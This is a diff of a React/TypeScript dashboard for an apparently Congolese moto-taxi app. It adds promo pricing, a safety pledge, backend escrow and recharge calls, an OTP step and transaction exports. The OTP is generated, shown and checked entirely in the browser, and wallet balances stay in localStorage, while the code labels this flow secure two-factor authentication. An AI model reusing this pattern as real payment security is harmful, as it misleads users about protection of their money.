@@ -8,6 +8,7 @@ import { motion, AnimatePresence } from "motion/react";
 import { UserProfile, RideRequest, WalletTransaction, AdminModificationRequest, DRCAddress, RideMessage, RideReview, SOSAlert, DocumentType } from "../types";
 import { mockAvenues, mockLocalities, getQuartiersForCommune, drcProvinces } from "../data/drcLocations";
 import MapSimulator from "./MapSimulator";
+import LiveMapTracking from "./LiveMapTracking";
 import EmergencySOS from "./EmergencySOS";
 import WeatherAlert from "./WeatherAlert";
 import { jsPDF } from "jspdf";
@@ -58,6 +59,7 @@ import {
   Key,
   RotateCcw,
   AlertTriangle,
+  Scale,
   Gift,
   Share2,
   Copy,
@@ -71,6 +73,9 @@ import {
 } from "lucide-react";
 
 import { AppLanguage, translations } from "../lib/translations";
+import { DiscountCode, applyPromoToAmount } from "../lib/promo_store";
+import { ClientPromotionHub } from "./PromotionManager";
+import ChatWorkspaceManager from "./ChatWorkspaceManager";
 
 interface ClientDashboardProps {
   profile: UserProfile;
@@ -93,7 +98,12 @@ export default function ClientDashboard({
   onTriggerSOS,
   sosAlerts = [],
 }: ClientDashboardProps) {
-  const [activeTab, setActiveTab] = useState<"ride" | "wallet" | "profile" | "security" | "history" | "disputes">("ride");
+  const [activeTab, setActiveTab] = useState<"ride" | "wallet" | "profile" | "history" | "disputes" | "promotions">("ride");
+  const [lastCacheSyncString, setLastCacheSyncString] = useState("");
+  const [securityEvents, setSecurityEvents] = useState<any[]>([]);
+  const [blockedAttack, setBlockedAttack] = useState<any | null>(null);
+  const [clientOtpNotify, setClientOtpNotify] = useState(false);
+  
   const [completedRides, setCompletedRides] = useState<RideRequest[]>(() => {
     const saved = localStorage.getItem(`gomoto_rides_history_${profile.id}`);
     if (saved) {
@@ -177,21 +187,21 @@ export default function ClientDashboard({
 
   const [showSOSModal, setShowSOSModal] = useState(false);
 
-  // Security Anti-Hacking & Intrusion States
-  const [securityEvents, setSecurityEvents] = useState<SecurityEvent[]>(() => {
-    const saved = localStorage.getItem(`gomoto_security_events_${profile.id}`);
-    return saved ? JSON.parse(saved) : getPresetSecurityEvents();
-  });
-  const [blockedAttack, setBlockedAttack] = useState<SecurityEvent | null>(null);
-  const [selectedSimulatedAttack, setSelectedSimulatedAttack] = useState<string>("sqli_bypass");
-  const [ipBanCountdown, setIpBanCountdown] = useState<number>(0);
-  const [isIntegrityChecking, setIsIntegrityChecking] = useState<boolean>(false);
-  const [integrityStatus, setIntegrityStatus] = useState<"secure" | "checking" | "warning">("secure");
-  
+  // Recharge 2FA OTP security states
+  const [rechargeOtpSent, setRechargeOtpSent] = useState<boolean>(false);
+  const [rechargeGeneratedOtp, setRechargeGeneratedOtp] = useState<string>("");
+  const [rechargeEnteredOtp, setRechargeEnteredOtp] = useState<string>("");
+  const [rechargeOtpError, setRechargeOtpError] = useState<string | null>(null);
+
+  // Ride History Search & Filter states
+  const [historySearchQuery, setHistorySearchQuery] = useState<string>("");
+  const [historyPriceRange, setHistoryPriceRange] = useState<string>("all");
+
   // Locations states
   const [pickupRoad, setPickupRoad] = useState<string>("");
   const [dropoffRoad, setDropoffRoad] = useState<string>("");
   const [selectedClass, setSelectedClass] = useState<"moto_classique" | "moto_premium" | "moto_cargo">("moto_classique");
+  const [appliedPromo, setAppliedPromo] = useState<DiscountCode | null>(null);
   const [selectedProvinceId, setSelectedProvinceId] = useState<string>("kinshasa");
   const [selectedCityName, setSelectedCityName] = useState<string>("Kinshasa");
   const [selectedCommuneName, setSelectedCommuneName] = useState<string>("Gombe");
@@ -200,6 +210,52 @@ export default function ClientDashboard({
 
   // Ride Simulation states
   const [rideStatus, setRideStatus] = useState<RideRequest["status"] | "idle">("idle");
+  const [rideHelmetConsent, setRideHelmetConsent] = useState<boolean>(false);
+  
+  // Mandatory Road Safety Pact (Engagement Obligatoire au Pacte de Sécurité)
+  const [isPactSigned, setIsPactSigned] = useState<boolean>(() => {
+    return localStorage.getItem(`gomoto_pact_signed_client_${profile.id}`) === "true";
+  });
+  const [pledgeName, setPledgeName] = useState<string>(`${profile.firstName} ${profile.lastName}`);
+  const [pledgeRole, setPledgeRole] = useState<"client" | "driver" | "owner">("client");
+  const [pledgeCasque, setPledgeCasque] = useState<boolean>(false);
+  const [pledgeRules, setPledgeRules] = useState<boolean>(false);
+  const [pledgeNoProhibited, setPledgeNoProhibited] = useState<boolean>(false);
+  const [pledgeRespectDrivers, setPledgeRespectDrivers] = useState<boolean>(false);
+  const [pledgeRespectAgents, setPledgeRespectAgents] = useState<boolean>(false);
+  const [pledgeZeroTolerance, setPledgeZeroTolerance] = useState<boolean>(false);
+  const [pledgeCertCode, setPledgeCertCode] = useState<string>(() => {
+    return localStorage.getItem(`gomoto_pact_cert_client_${profile.id}`) || "";
+  });
+  const [pledgeDateStr, setPledgeDateStr] = useState<string>(() => {
+    return localStorage.getItem(`gomoto_pact_date_client_${profile.id}`) || "";
+  });
+
+  const handleSignPact = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!pledgeName.trim() || !pledgeCasque || !pledgeRules || !pledgeNoProhibited || !pledgeRespectDrivers || !pledgeRespectAgents || !pledgeZeroTolerance) return;
+    const randomHex = Math.floor(100000 + Math.random() * 900000).toString();
+    const generatedCert = `GOMOTO-RDC-SEC-PASS-${randomHex}`;
+    
+    const options: Intl.DateTimeFormatOptions = { 
+      day: 'numeric', 
+      month: 'long', 
+      year: 'numeric', 
+      hour: '2-digit', 
+      minute: '2-digit',
+      second: '2-digit'
+    };
+    const nowStr = new Date().toLocaleDateString("fr-CD", options);
+    
+    localStorage.setItem(`gomoto_pact_signed_client_${profile.id}`, "true");
+    localStorage.setItem(`gomoto_pact_cert_client_${profile.id}`, generatedCert);
+    localStorage.setItem(`gomoto_pact_date_client_${profile.id}`, nowStr);
+    
+    setPledgeCertCode(generatedCert);
+    setPledgeDateStr(nowStr);
+    setIsPactSigned(true);
+    setRideHelmetConsent(true); // Automatically consent for the current ride since they signed the whole general pact
+  };
   const [assignedDriver, setAssignedDriver] = useState<{
     name: string;
     phone: string;
@@ -212,6 +268,7 @@ export default function ClientDashboard({
   // Position states for dynamic map tracking
   const [driverPos, setDriverPos] = useState({ x: 150, y: 140 });
   const [passengerPos, setPassengerPos] = useState({ x: 240, y: 220 });
+  const [mapViewMode, setMapViewMode] = useState<"simulator" | "live">("live");
   const [distanceKm, setDistanceKm] = useState(2.8);
 
   // Wallet Recharge States
@@ -231,8 +288,6 @@ export default function ClientDashboard({
   
   // Offline & Connectivity states (IndexedDB / Local Caching)
   const [isOnline, setIsOnline] = useState<boolean>(() => typeof navigator !== "undefined" ? navigator.onLine : true);
-  const [offlineModeSimulated, setOfflineModeSimulated] = useState<boolean>(false);
-  const [lastCacheSyncString, setLastCacheSyncString] = useState<string>("");
   
   // Custom disputes and arbitrage states
   interface DisputeRecord {
@@ -266,9 +321,6 @@ export default function ClientDashboard({
   const [arbitrageRefundCurrency, setArbitrageRefundCurrency] = useState<"CDF" | "USD">("CDF");
   
   // Referral (Parrainage) states
-  const [invitedName, setInvitedName] = useState("");
-  const [invitedPhone, setInvitedPhone] = useState("+243 ");
-  const [referralFeedback, setReferralFeedback] = useState("");
   const [isCopied, setIsCopied] = useState(false);
 
   // Préférences de course states
@@ -470,19 +522,6 @@ export default function ClientDashboard({
         .catch(err => console.error("Failed to automatically synchronize completed rides to database:", err));
     }
   }, [completedRides, profile.id]);
-
-  // Synchronize dynamic cyber-security event logs
-  useEffect(() => {
-    localStorage.setItem(`gomoto_security_events_${profile.id}`, JSON.stringify(securityEvents));
-  }, [securityEvents, profile.id]);
-
-  // Countdowns for IP lockout simulation
-  useEffect(() => {
-    if (ipBanCountdown > 0) {
-      const timer = setTimeout(() => setIpBanCountdown(prev => prev - 1), 1000);
-      return () => clearTimeout(timer);
-    }
-  }, [ipBanCountdown]);
 
   // Initialize avenues and transaction histories
   useEffect(() => {
@@ -711,6 +750,31 @@ export default function ClientDashboard({
 
   const prices = getPrices();
 
+  const finalPrices = (() => {
+    const usdRate = 2800;
+    if (!appliedPromo) {
+      return {
+        cdf: prices.cdf,
+        usd: prices.usd,
+        discountCDF: 0,
+        discountUSD: 0,
+        applied: false
+      };
+    }
+    const applied = applyPromoToAmount(prices.cdf, "CDF", appliedPromo, usdRate);
+    const discCDF = applied.discountAmount;
+    const finalCDF = applied.finalAmount;
+    const finalUSD = parseFloat((finalCDF / usdRate).toFixed(2));
+    const discUSD = parseFloat((discCDF / usdRate).toFixed(2));
+    return {
+      cdf: finalCDF,
+      usd: finalUSD,
+      discountCDF: discCDF,
+      discountUSD: discUSD,
+      applied: true
+    };
+  })();
+
   const getETA = () => {
     if (rideStatus === "searching") return "Recherche de chauffeur...";
     if (rideStatus === "accepted") {
@@ -782,16 +846,16 @@ export default function ClientDashboard({
     let paymentUsed: "CDF" | "USD" = "CDF";
     let paymentAmount = 0;
 
-    if (profile.walletBalanceCDF >= prices.cdf) {
-      newBalanceCDF -= prices.cdf;
+    if (profile.walletBalanceCDF >= finalPrices.cdf) {
+      newBalanceCDF -= finalPrices.cdf;
       paymentUsed = "CDF";
-      paymentAmount = prices.cdf;
-    } else if (profile.walletBalanceUSD >= prices.usd) {
-      newBalanceUSD -= prices.usd;
+      paymentAmount = finalPrices.cdf;
+    } else if (profile.walletBalanceUSD >= finalPrices.usd) {
+      newBalanceUSD -= finalPrices.usd;
       paymentUsed = "USD";
-      paymentAmount = prices.usd;
+      paymentAmount = finalPrices.usd;
     } else {
-      alert(`Solde insuffisant dans votre portefeuille. Le trajet coûte ${prices.cdf.toLocaleString()} CDF / $${prices.usd} USD.`);
+      alert(`Solde insuffisant dans votre portefeuille. Le trajet coûte ${finalPrices.cdf.toLocaleString()} CDF / $${finalPrices.usd} USD.`);
       return;
     }
 
@@ -828,11 +892,12 @@ export default function ClientDashboard({
         avenue: dropoffRoad,
       },
       status: "searching" as const,
-      priceCDF: prices.cdf,
-      priceUSD: prices.usd,
+      priceCDF: finalPrices.cdf,
+      priceUSD: finalPrices.usd,
       distanceKm: distanceKm,
       paymentUsed: paymentUsed,
       isReparoPaid: true,
+      securityPin: Math.floor(1000 + Math.random() * 9000).toString(),
       timestamp: new Date().toLocaleDateString("fr-FR") + " " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' })
     };
 
@@ -1173,8 +1238,8 @@ export default function ClientDashboard({
     return () => clearInterval(timer);
   }, [rideStatus]);
 
-  const handleCompleteRide = () => {
-    // Release REPARO escrow funds to chauffeur, owner & GoMoto at completion
+  const handleCompleteRide = async () => {
+    // Call the newly implemented Secure Backend Escrow Release
     const savedRideStr = localStorage.getItem("gomoto_active_ride");
     let paymentUsed: "CDF" | "USD" = "CDF";
     let paymentAmount = 0;
@@ -1188,124 +1253,147 @@ export default function ClientDashboard({
       paymentAmount = paymentUsed === "CDF" ? prices.cdf : prices.usd;
     }
 
-    const driverPercent = 0.70;
-    const ownerPercent = 0.15;
-
-    const driverShare = paymentUsed === "CDF" ? Math.round(paymentAmount * driverPercent) : parseFloat((paymentAmount * driverPercent).toFixed(2));
-    const ownerShare = paymentUsed === "CDF" ? Math.round(paymentAmount * ownerPercent) : parseFloat((paymentAmount * ownerPercent).toFixed(2));
-
-    // Update other users in local storage database
-    const usersStr = localStorage.getItem("gomoto_users");
-    if (usersStr) {
-      const users: UserProfile[] = JSON.parse(usersStr);
-      const updatedUsers = users.map(u => {
-        // Credit Driver "usr-driver-777"
-        if (u.id === "usr-driver-777" || u.role === "driver") {
-          const newCDF = paymentUsed === "CDF" ? u.walletBalanceCDF + driverShare : u.walletBalanceCDF;
-          const newUSD = paymentUsed === "USD" ? u.walletBalanceUSD + driverShare : u.walletBalanceUSD;
-          
-          // Append transaction log for driver
-          const txId = "tx-earn-" + Math.random().toString(36).substr(2, 6);
-          const driverTx: WalletTransaction = {
-            id: txId,
-            userId: u.id,
-            amount: driverShare,
-            currency: paymentUsed,
-            type: "ride_payment",
-            method: "Wallet_System",
-            status: "completed",
-            date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' }),
-            rideDetails: {
-              pickup: `${pickupRoad}, ${profile.address.commune}`,
-              dropoff: `${dropoffRoad}, ${profile.address.commune}`,
-              driverName: profile.firstName + " " + profile.lastName,
-              distanceKm: Number(distanceKm.toFixed(1))
-            }
-          };
-          const currentDriverTxs = JSON.parse(localStorage.getItem(`gomoto_transactions_${u.id}`) || "[]");
-          localStorage.setItem(`gomoto_transactions_${u.id}`, JSON.stringify([driverTx, ...currentDriverTxs]));
-          
-          return {
-            ...u,
-            walletBalanceCDF: newCDF,
-            walletBalanceUSD: parseFloat(newUSD.toFixed(2)),
-            ridesCompleted: u.ridesCompleted + 1
-          };
-        }
-        
-        // Credit Owner "usr-owner-441"
-        if (u.id === "usr-owner-441" || u.role === "owner") {
-          const newCDF = paymentUsed === "CDF" ? u.walletBalanceCDF + ownerShare : u.walletBalanceCDF;
-          const newUSD = paymentUsed === "USD" ? u.walletBalanceUSD + ownerShare : u.walletBalanceUSD;
-          
-          // Append transaction log for owner
-          const txId = "tx-earn-owner-" + Math.random().toString(36).substr(2, 6);
-          const ownerTx: WalletTransaction = {
-            id: txId,
-            userId: u.id,
-            amount: ownerShare,
-            currency: paymentUsed,
-            type: "ride_payment",
-            method: "Wallet_System",
-            status: "completed",
-            date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' }),
-            rideDetails: {
-              pickup: `${pickupRoad}, ${profile.address.commune}`,
-              dropoff: `${dropoffRoad}, ${profile.address.commune}`,
-              driverName: "Ir. Héritier LUKUSA (Option 15% Propriétaire)",
-              distanceKm: Number(distanceKm.toFixed(1))
-            }
-          };
-          const currentOwnerTxs = JSON.parse(localStorage.getItem(`gomoto_transactions_${u.id}`) || "[]");
-          localStorage.setItem(`gomoto_transactions_${u.id}`, JSON.stringify([ownerTx, ...currentOwnerTxs]));
-          
-          return {
-            ...u,
-            walletBalanceCDF: newCDF,
-            walletBalanceUSD: parseFloat(newUSD.toFixed(2))
-          };
-        }
-        return u;
+    try {
+      // PROXY CALL: Backend processes the 70/15/15 rules inalterably
+      const res = await fetch("/api/escrow/release", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          rideId: currentRideId || "ride-active",
+          clientPrice: paymentAmount,
+          currency: paymentUsed,
+          clientId: profile.id,
+          driverId: "usr-driver-777",
+          ownerId: "usr-owner-441"
+        })
       });
-      localStorage.setItem("gomoto_users", JSON.stringify(updatedUsers));
-    }
 
-    // Mark the pending upfront payment transaction as completed
-    setTransactions(prev => {
-      const updated = prev.map(t => {
-        if (t.type === "ride_payment" && t.status === "pending") {
-          return { ...t, status: "completed" as const };
-        }
-        return t;
+      const serverData = await res.json();
+      
+      if (!serverData.success) {
+        showToast("error", "Erreur Escrow", serverData.error);
+        return;
+      }
+
+      const { driverCredited, ownerCredited, adminCommission } = serverData.distribution;
+
+      // Update other users in local storage database (To show in UI)
+      const usersStr = localStorage.getItem("gomoto_users");
+      if (usersStr) {
+        const users: UserProfile[] = JSON.parse(usersStr);
+        const updatedUsers = users.map(u => {
+          // Credit Driver "usr-driver-777"
+          if (u.id === "usr-driver-777" || u.role === "driver") {
+            const newCDF = paymentUsed === "CDF" ? u.walletBalanceCDF + driverCredited : u.walletBalanceCDF;
+            const newUSD = paymentUsed === "USD" ? u.walletBalanceUSD + driverCredited : u.walletBalanceUSD;
+            
+            // Append transaction log for driver
+            const txId = "tx-earn-" + Math.random().toString(36).substr(2, 6);
+            const driverTx: WalletTransaction = {
+              id: txId,
+              userId: u.id,
+              amount: driverCredited,
+              currency: paymentUsed,
+              type: "ride_payment",
+              method: "Wallet_System",
+              status: "completed",
+              date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' }),
+              rideDetails: {
+                pickup: `${pickupRoad}, ${profile.address.commune}`,
+                dropoff: `${dropoffRoad}, ${profile.address.commune}`,
+                driverName: profile.firstName + " " + profile.lastName,
+                distanceKm: Number(distanceKm.toFixed(1))
+              }
+            };
+            const currentDriverTxs = JSON.parse(localStorage.getItem(`gomoto_transactions_${u.id}`) || "[]");
+            localStorage.setItem(`gomoto_transactions_${u.id}`, JSON.stringify([driverTx, ...currentDriverTxs]));
+            
+            return {
+              ...u,
+              walletBalanceCDF: newCDF,
+              walletBalanceUSD: parseFloat(newUSD.toFixed(2)),
+              ridesCompleted: u.ridesCompleted + 1
+            };
+          }
+          
+          // Credit Owner "usr-owner-441"
+          if (u.id === "usr-owner-441" || u.role === "owner") {
+            const newCDF = paymentUsed === "CDF" ? u.walletBalanceCDF + ownerCredited : u.walletBalanceCDF;
+            const newUSD = paymentUsed === "USD" ? u.walletBalanceUSD + ownerCredited : u.walletBalanceUSD;
+            
+            // Append transaction log for owner
+            const txId = "tx-earn-owner-" + Math.random().toString(36).substr(2, 6);
+            const ownerTx: WalletTransaction = {
+              id: txId,
+              userId: u.id,
+              amount: ownerCredited,
+              currency: paymentUsed,
+              type: "ride_payment",
+              method: "Wallet_System",
+              status: "completed",
+              date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' }),
+              rideDetails: {
+                pickup: `${pickupRoad}, ${profile.address.commune}`,
+                dropoff: `${dropoffRoad}, ${profile.address.commune}`,
+                driverName: "Ir. Héritier LUKUSA (Option 15% Propriétaire)",
+                distanceKm: Number(distanceKm.toFixed(1))
+              }
+            };
+            const currentOwnerTxs = JSON.parse(localStorage.getItem(`gomoto_transactions_${u.id}`) || "[]");
+            localStorage.setItem(`gomoto_transactions_${u.id}`, JSON.stringify([ownerTx, ...currentOwnerTxs]));
+            
+            return {
+              ...u,
+              walletBalanceCDF: newCDF,
+              walletBalanceUSD: parseFloat(newUSD.toFixed(2))
+            };
+          }
+          return u;
+        });
+        localStorage.setItem("gomoto_users", JSON.stringify(updatedUsers));
+      }
+
+      // Mark the pending upfront payment transaction as completed
+      setTransactions(prev => {
+        const updated = prev.map(t => {
+          if (t.type === "ride_payment" && t.status === "pending") {
+            return { ...t, status: "completed" as const };
+          }
+          return t;
+        });
+        localStorage.setItem(`gomoto_transactions_${profile.id}`, JSON.stringify(updated));
+        return updated;
       });
-      localStorage.setItem(`gomoto_transactions_${profile.id}`, JSON.stringify(updated));
-      return updated;
-    });
 
-    onUpdateProfile({
-      ...profile,
-      ridesCompleted: profile.ridesCompleted + 1
-    });
+      onUpdateProfile({
+        ...profile,
+        ridesCompleted: profile.ridesCompleted + 1
+      });
 
-    setRideStatus("completed");
-    setShowPaymentConfirmationModal(false);
-    setPaymentDetailsForModal(null);
+      setRideStatus("completed");
+      setShowPaymentConfirmationModal(false);
+      setPaymentDetailsForModal(null);
 
-    showToast(
-      "success",
-      "Paiement validé !",
-      `Le trajet est complété avec succès ! L'engagement REPARO (${paymentAmount.toLocaleString()} ${paymentUsed}) a été déverrouillé et transmis de façon transparente.`
-    );
+      showToast(
+        "success",
+        "Paiement Intervenu !",
+        "Le Backend a clôturé la transaction avec succès et sécurisé la libération des fonds en toute conformité."
+      );
 
-    // Sync completion status and payment distribution to localStorage active ride
-    if (savedRideStr) {
-      const parsed = JSON.parse(savedRideStr);
-      parsed.status = "completed";
-      parsed.paymentDistributed = true;
-      localStorage.setItem("gomoto_active_ride", JSON.stringify(parsed));
+      // Sync completion status and payment distribution to localStorage active ride
+      if (savedRideStr) {
+        const parsed = JSON.parse(savedRideStr);
+        parsed.status = "completed";
+        parsed.paymentDistributed = true;
+        localStorage.setItem("gomoto_active_ride", JSON.stringify(parsed));
+      }
+
+      alert(serverData.message);
+      
+    } catch (error) {
+      console.error("Escrow backend API error:", error);
+      showToast("error", "Erreur Réseau", "Impossible de contacter le module Escrow du backend.");
     }
-
-    alert(`Course achevée ! Montant de ${paymentAmount.toLocaleString()} ${paymentUsed} libéré de l'entravement REPARO :\n - 70% pour le Motard (Héritier)\n - 15% pour le Propriétaire de Flotte (Dieudonné)\n - 15% Commission plateforme GoMoto.`);
   };
 
   const handleFinishRating = () => {
@@ -1896,7 +1984,7 @@ export default function ClientDashboard({
   };
 
   // Recharge trigger
-  const handleRechargeWallet = (e: React.FormEvent) => {
+  const handleRechargeWallet = async (e: React.FormEvent) => {
     e.preventDefault();
 
     // Cyber Security threat interception
@@ -1924,7 +2012,15 @@ export default function ClientDashboard({
         details: details
       };
 
-      setSecurityEvents(prev => [attackEvent, ...prev]);
+      try {
+        const currentEventsStr = localStorage.getItem("gomoto_security_events_admin") || "[]";
+        const currentEvents = JSON.parse(currentEventsStr);
+        currentEvents.unshift(attackEvent);
+        localStorage.setItem("gomoto_security_events_admin", JSON.stringify(currentEvents));
+      } catch (secErr) {
+        console.error("Error logging attack event to ledger", secErr);
+      }
+
       setBlockedAttack(attackEvent);
       setShowRechargeModal(false);
       return;
@@ -1934,178 +2030,200 @@ export default function ClientDashboard({
     const amountNum = parseFloat(rechargeAmount);
     if (!amountNum || amountNum <= 0) return;
 
-    let newBalanceCDF = profile.walletBalanceCDF;
-    let newBalanceUSD = profile.walletBalanceUSD;
-
-    if (rechargeCurrency === "CDF") {
-      newBalanceCDF += amountNum;
-    } else {
-      newBalanceUSD += amountNum;
+    // Interactive 2FA OTP Protocol Check (Recommandation #1)
+    if (!rechargeOtpSent) {
+      const code = Math.floor(100000 + Math.random() * 900000).toString();
+      setRechargeGeneratedOtp(code);
+      setRechargeOtpSent(true);
+      setRechargeOtpError(null);
+      setClientOtpNotify(`[SMS SECURE - RECHARGE] Code de validation double facteur GoMoto : ${code} pour authentifier le dépôt de ${amountNum} ${rechargeCurrency}.`);
+      
+      // Auto-clear notification after 20 seconds
+      setTimeout(() => {
+        setClientOtpNotify(null);
+      }, 20000);
+      return;
     }
 
-    const newTx: WalletTransaction = {
-      id: "tx-rec-" + Math.random().toString(36).substr(2, 6),
-      userId: profile.id,
-      amount: amountNum,
-      currency: rechargeCurrency,
-      type: "deposit",
-      method: rechargeMethod as any,
-      status: "completed",
-      date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' })
-    };
+    if (rechargeEnteredOtp !== rechargeGeneratedOtp || rechargeGeneratedOtp === "") {
+      setRechargeOtpError("Le code OTP saisi ne correspond pas. Veuillez inscrire le code d'État reçu.");
+      return;
+    }
 
-    setTransactions(prev => {
-      const updated = [newTx, ...prev];
-      localStorage.setItem(`gomoto_transactions_${profile.id}`, JSON.stringify(updated));
-      return updated;
-    });
-    onUpdateProfile({
-      ...profile,
-      walletBalanceCDF: newBalanceCDF,
-      walletBalanceUSD: parseFloat(newBalanceUSD.toFixed(2))
-    });
+    try {
+      // Backend Request Call
+      const res = await fetch("/api/wallet/recharge", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userId: profile.id,
+          amountCDF: rechargeCurrency === "CDF" ? amountNum : amountNum * 2800, // Normalized
+          currency: rechargeCurrency,
+          operator: rechargeMethod,
+          transactionRef: "TRX-" + Math.random().toString(36).substr(2, 8).toUpperCase()
+        })
+      });
 
-    showToast(
-      "success",
-      "Paiement validé !",
-      `Votre recharge de ${amountNum.toLocaleString()} ${rechargeCurrency} via ${rechargeMethod} a été validée d'État et créditée sur votre Solde.`
-    );
+      const serverData = await res.json();
+      
+      if (!serverData.success) {
+        setRechargeOtpError(serverData.error || "La transaction a été refusée par le serveur backend.");
+        return;
+      }
+
+      let newBalanceCDF = profile.walletBalanceCDF;
+      let newBalanceUSD = profile.walletBalanceUSD;
+
+      if (rechargeCurrency === "CDF") {
+        newBalanceCDF += amountNum;
+      } else {
+        newBalanceUSD += amountNum;
+      }
+
+      const newTx: WalletTransaction = {
+        id: "tx-rec-" + Math.random().toString(36).substr(2, 6),
+        userId: profile.id,
+        amount: amountNum,
+        currency: rechargeCurrency,
+        type: "deposit",
+        method: rechargeMethod as any,
+        status: "completed",
+        date: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' })
+      };
+
+      setTransactions(prev => {
+        const updated = [newTx, ...prev];
+        localStorage.setItem(`gomoto_transactions_${profile.id}`, JSON.stringify(updated));
+        return updated;
+      });
+      onUpdateProfile({
+        ...profile,
+        walletBalanceCDF: newBalanceCDF,
+        walletBalanceUSD: parseFloat(newBalanceUSD.toFixed(2))
+      });
+
+      // Log the successful 2FA validation trace in security database
+      try {
+        const currentEventsStr = localStorage.getItem("gomoto_security_events_admin") || "[]";
+        const currentEvents = JSON.parse(currentEventsStr);
+        const newSecEvent = {
+          id: "sh-evt-" + Math.random().toString(36).substr(2, 6),
+          timestamp: new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
+          threatType: "OTP Verification",
+          rawInput: "2FA Verified (Success)",
+          sourceIp: "197.228.10.45 (Kinshasa, RDC - M-Pesa client)",
+          actionTaken: "VERIFIED & PASSED",
+          riskScore: "SECURE",
+          location: `Kinshasa (${profile.address?.commune || "Limete"})`,
+          details: `Validation 2FA réussie par l'API pour le client ${profile.firstName} ${profile.lastName} lors du rechargement de ${amountNum} ${rechargeCurrency} via ${rechargeMethod}. Backend : ${serverData.message}`
+        };
+        currentEvents.unshift(newSecEvent);
+        localStorage.setItem("gomoto_security_events_admin", JSON.stringify(currentEvents));
+      } catch (secErr) {
+        console.error("Error logging 2FA audit trace to ledger", secErr);
+      }
+
+      showToast(
+        "success",
+        "Paiement M-Pesa Sécurisé",
+        `Backend : ${serverData.message}`
+      );
+    } catch (apiErr) {
+      setRechargeOtpError("Erreur réseau : Impossible de contacter la passerelle de paiement sécurisée.");
+      return;
+    }
 
     setShowRechargeModal(false);
+    setRechargeOtpSent(false);
+    setRechargeGeneratedOtp("");
+    setRechargeEnteredOtp("");
+    setRechargeOtpError(null);
+    setClientOtpNotify(null);
   };
 
-  const handleInviteFriendSimulated = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!invitedName.trim()) {
-      setReferralFeedback("⚠️ Veuillez renseigner le nom de la personne à parrainer.");
+  const handleExportWalletCSV = () => {
+    if (!transactions || transactions.length === 0) {
+      showToast("error", "Erreur d'export", "Aucune transaction disponible pour l'export.");
       return;
     }
-    if (!invitedPhone.trim() || invitedPhone.trim() === "+243") {
-      setReferralFeedback("⚠️ Veuillez renseigner le numéro de téléphone en RDC (+243...).");
+    
+    let csvContent = "ID,Type,Montant,Devise,Methode,Date,Statut\n";
+    transactions.forEach(tx => {
+      const typeStr = tx.type === "deposit" ? "Crédit/Dépôt" : "Débit/Course";
+      csvContent += `${tx.id},${typeStr},${tx.amount},${tx.currency},${tx.method},"${tx.date}",${tx.status}\n`;
+    });
+    
+    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement("a");
+    link.setAttribute("href", url);
+    link.setAttribute("download", `gomoto_wallet_transactions_${new Date().getTime()}.csv`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    showToast("success", "Export CSV", "Le fichier CSV a été généré avec succès.");
+  };
+
+  const handleExportWalletPDF = () => {
+    if (!transactions || transactions.length === 0) {
+      showToast("error", "Erreur d'export", "Aucune transaction disponible pour l'export.");
       return;
     }
 
-    const newCount = (profile.referralCount || 0) + 1;
-    const bonusCDF = 15000;
-    const bonusUSD = 5.00;
+    const doc = new jsPDF();
 
-    const newCDFBand = profile.walletBalanceCDF + bonusCDF;
-    const newUSDBand = profile.walletBalanceUSD + bonusUSD;
+    // En-tête
+    doc.setFont("helvetica", "bold");
+    doc.setFontSize(22);
+    doc.text("GOMOTO RDC", 14, 20);
 
-    const txIdBase = "tx-ref-" + Math.random().toString(36).substr(2, 6);
-    const dateFormatted = new Date().toLocaleDateString("fr-FR") + " à " + new Date().toLocaleTimeString("fr-FR", { hour: '2-digit', minute: '2-digit' })
+    doc.setFontSize(14);
+    doc.setTextColor(100, 100, 100);
+    doc.text("Relevé de Transactions - Wallet", 14, 28);
 
-    const txCDF: WalletTransaction = {
-      id: `${txIdBase}-cdf`,
-      userId: profile.id,
-      amount: bonusCDF,
-      currency: "CDF",
-      type: "deposit",
-      method: "Wallet_System",
-      status: "completed",
-      date: dateFormatted
-    };
+    doc.setFontSize(10);
+    doc.text(`Client : ${profile.firstName} ${profile.lastName}`, 14, 38);
+    doc.text(`Date d'export : ${new Date().toLocaleDateString('fr-FR')} à ${new Date().toLocaleTimeString('fr-FR')}`, 14, 44);
 
-    const txUSD: WalletTransaction = {
-      id: `${txIdBase}-usd`,
-      userId: profile.id,
-      amount: bonusUSD,
-      currency: "USD",
-      type: "deposit",
-      method: "Wallet_System",
-      status: "completed",
-      date: dateFormatted
-    };
+    // Ligne de séparation
+    doc.setDrawColor(200, 200, 200);
+    doc.line(14, 48, 196, 48);
 
-    setTransactions(prev => {
-      const updated = [txCDF, txUSD, ...prev];
-      localStorage.setItem(`gomoto_transactions_${profile.id}`, JSON.stringify(updated));
-      return updated;
+    doc.setFontSize(11);
+    doc.setTextColor(0, 0, 0);
+
+    let yPos = 56;
+    
+    transactions.forEach((tx) => {
+      if (yPos > 270) {
+        doc.addPage();
+        yPos = 20;
+      }
+
+      // Format line
+      const typeLabel = tx.type === "deposit" ? "+ CREDIT" : "- DEBIT ";
+      const fontColor = tx.type === "deposit" ? [0, 150, 0] : [200, 0, 0];
+      
+      doc.setFont("helvetica", "bold");
+      // @ts-ignore
+      doc.setTextColor(...fontColor);
